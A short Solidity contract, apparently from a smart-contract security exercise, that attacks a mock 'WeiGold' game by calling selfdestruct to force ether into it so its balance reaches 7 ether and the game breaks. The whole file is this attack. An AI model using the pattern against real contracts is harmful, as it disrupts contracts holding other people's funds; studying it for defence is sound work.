// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "./MockWeiGold.sol";

contract SelfDestructSendOneEthereum {
    WeiGold WeiGoldInstance;

    constructor(WeiGold WeiGoldDeployedAddress) {
        WeiGoldInstance = WeiGold(WeiGoldDeployedAddress);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(WeiGoldInstance));
        selfdestruct(addr);
    }
}
